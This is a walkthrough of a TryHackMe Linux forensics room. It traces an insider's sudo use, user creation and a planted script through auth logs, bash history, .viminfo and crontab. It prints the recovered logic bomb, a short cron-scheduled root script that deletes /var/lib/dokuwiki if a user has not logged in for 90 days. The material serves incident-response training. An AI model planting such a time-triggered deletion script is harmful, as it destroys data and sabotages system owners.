```
╺┳┓╻┏━┓┏━╸┏━┓╻ ╻┏┓╻╺┳╸╻  ┏━╸╺┳┓   
 ┃┃┃┗━┓┃╺┓┣┳┛┃ ┃┃┗┫ ┃ ┃  ┣╸  ┃┃   
╺┻┛╹┗━┛┗━┛╹┗╸┗━┛╹ ╹ ╹ ┗━╸┗━╸╺┻┛
```
Use your Linux forensics knowledge to investigate an incident. [^1]

Task 3: Nothing suspicious... So far
-----------------------------------------------------------------------------------------
**The user installed a package on the machine using elevated privileges. According to the 
logs what is the full COMMAND?**

Since the introduction advises us to look at the logs, it becomes clear to us to move to
the `/var/log/` directory and since it further tells that the user had elevated 
privileges, we suspect `/var/log/auth.log.1` to contain the command we are looking for.
Note, that `/var/log/auth.log` contains the active authentication log and 
`/var/log/auth.log.1` the previous authentication log with older entries. Next, we search
for *sudo* and then *install* with `cat auth.log.1 | grep "sudo" | grep "install"` and
thus discover the following log entry with the installed package as follows.

> Dec 28 06:19:01 ip-10-10-168-55 sudo: cybert : TTY=pts/0 ; PWD=[REDACTED] ;
    USER=root ; COMMAND=[REDACTED]

**What was the present working directory (PWD) when the previous command was run?**

The present working directory can be obtained from the previous log entry as well.

Task 4: Let's see if you did anything bad
-----------------------------------------------------------------------------------------
**Which user was created after the package from the previous task was installed?**

Again, we search in the `/var/log/auth.log.1` file for this operation, but this time for
the `useradd` command. Therefore, we discover this log entry with a new user addition.

> Dec 28 06:26:53 ip-10-10-168-55 useradd[15328]: new user: name=[REDACTED], UID=1002,
> GID=1002, shell=/bin/bash

**A user was then later given sudo privileges. When was the sudoers file updated?**

This time, we search in the log file for `visudo` which is the command to edit the 
sudoers file. The log entry that should be investigated is as follows. It contains the
timestamp that is asked for in this task.

> [REDACTED] ip-10-10-168-55 sudo: cybert : TTY=pts/0 ; PWD=/home/cybert ;
> USER=root ; COMMAND=/usr/sbin/visudo

**A script file was opened using the "vi" text editor. What is the file name?**

Once again, we search the `auth.log.1` file for the `vi` command and thus discover the 
following log entry which states how a certain script file was opened.

> Dec 28 06:29:14 ip-10-10-168-55 sudo: it-admin : TTY=pts/0; USER=root ;
> COMMAND=/usr/bin/vi [REDACTED]

Task  5: Bomb has been planted. But when and where?
-----------------------------------------------------------------------------------------
**What is the command used that created the file bomb.sh?**

From the previous question, we know that the `bomb.sh` script was executed by the 
*it-admin* user in their home directory. So, we go there and print the contents of the 
`.bash_history` file. This way, we can obtain the command which created the suspicious 
script.

**The file was renamed and moved to a different directory. What is the full path of this
file now?**

Based of the previous bash history entries, the file was removed immediately after it was
opened with the `vi` editor. Now, we know that the `vi` editor can save files to a 
different location and check its log entries by opening the `.viminfo` file. There, we 
discover the line `:saveas [READACTED]` with the new filename.

**When was the file from the previous question last modified?**

For this, we can simply go to the `/bin` directory and list the file in a long listing 
format. Note, that we want the time and date.
```
root@ip-10-10-66-25:/bin# ls -l --time-style=long-iso os-update.sh
-rw-r--r-- 1 root root 325 2022-12-28 [REDACTED] os-update.s
```

**What is the name of the file that will get created when the file from the first
question executes?**

For this task, we want to print out the contents of the `os-update.sh` script. Here, we
can see the file contents with a mysterious text.

```bash
# 2022-06-05 - Initial version
# 2022-10-11 - Fixed bug
# 2022-10-15 - Changed from 30 days to 90 days
OUTPUT=`last -n 1 it-admin -s "-90days" | head -n 1`
if [ -z "$OUTPUT" ]; then
    rm -r /var/lib/dokuwiki
    echo -e "I TOLD YOU YOU'LL REGRET THIS!!! GOOD RIDDANCE!!! \
        HAHAHAHA\n-mistermeist3r" > /[REDACTED].txt
fi
```

Task 6: Following the fuse
-----------------------------------------------------------------------------------------
**At what time will the malicious file trigger?**

From the previous bash history logging, we remember that there was a `crontab` entry 
which schedules the trigger for the malicious file. So, we read the contents with 
`less /etc/crontab` and discover, in the last row, that the `/bin/os-update.sh` file is 
scheduled to run as root in likely 90 days from now on, with the exact time.

[^1]: https://tryhackme.com/room/disgruntled
